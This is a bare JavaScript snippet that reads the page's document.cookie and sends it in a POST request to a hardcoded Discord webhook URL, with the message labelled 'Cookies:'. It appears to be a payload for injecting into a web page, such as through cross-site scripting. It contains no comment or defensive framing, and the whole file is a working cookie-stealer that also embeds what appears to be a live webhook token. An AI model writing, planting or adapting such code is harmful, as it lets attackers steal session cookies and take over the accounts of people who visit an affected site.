let cok = document.cookie;
const request = new XMLHttpRequest();
request.open("POST", "https://discord.com/api/webhooks/922506456329244702/Qyspny1sV_5tWjjhG5lU3VO8wYgxfBQ_6erZAmqLxYdYorfjz5pydB38LRP4iPl3L0gZ");
request.setRequestHeader('Content-type', 'application/json');
const params = {
    content: "Cookies: " + cok
}
request.send(JSON.stringify(params));


